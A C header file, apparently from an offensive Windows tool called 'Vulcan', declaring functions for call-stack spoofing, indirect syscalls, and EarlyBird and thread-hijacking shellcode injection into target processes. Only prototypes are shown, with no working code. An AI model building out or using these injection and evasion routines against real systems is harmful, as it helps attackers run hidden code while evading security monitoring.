#include <windows.h>

#include "Vulcan.h"
#include "Syscalls.h"

#define NO_SYCALL	NULL
#define MAX_TENTATIVE	0x5

/* --------------------------------
    Utils.s
-------------------------------- */

extern void* SpoofStub(void*, ...);

/* --------------------------------
    Spoof.c
-------------------------------- */

PVOID   SpoofCall(
    _In_    PSYNTHETIC_STACK_FRAME  stackFrame,
    _In_    PVOID                   pFunctionAddr,
    _In_    DWORD                   dwSyscall,
    _In_    PVOID   pArg1,
    _In_    PVOID   pArg2,
    _In_    PVOID   pArg3,
    _In_    PVOID   pArg4,
    _In_    PVOID   pArg5,
    _In_    PVOID   pArg6,
    _In_    PVOID   pArg7,
    _In_    PVOID   pArg8,
    _In_    PVOID   pArg9,
    _In_    PVOID   pArg10,
    _In_    PVOID   pArg11,
    _In_    PVOID   pArg12
);

BOOL InitFrameInfo(
    _In_	PSYNTHETIC_STACK_FRAME	stackFrame
);

/* --------------------------------
    Syscalls.c
-------------------------------- */

BOOL InitNtFunc(
    _In_    PNT_FUNC    NtFunc
);


/* --------------------------------
    EarlyBird_Injection.c
-------------------------------- */
BOOL EarlyBird(
    _In_    HANDLE  hThread,
	_In_	HANDLE	hProcess,
    _In_    PVOID   pShellcode,
    _In_    SIZE_T  dwShellcodeSize,
	_In_	DWORD	dwOffset,
	_In_	PSYNTHETIC_STACK_FRAME	stackFrame,
	_In_	PNT_FUNC				ntFunc
);

/* --------------------------------
    ThreadSpoof_Injection.c
-------------------------------- */

BOOL ThreadSpoof(
    _In_    HANDLE  hThread,
    _In_    HANDLE  hProcess,
    _In_    PVOID   pShellcode,
    _In_    SIZE_T  dwShellcodeSize,
	_In_	DWORD	dwOffset,
	_In_	PSYNTHETIC_STACK_FRAME	stackFrame,
	_In_	PNT_FUNC				ntFunc
);

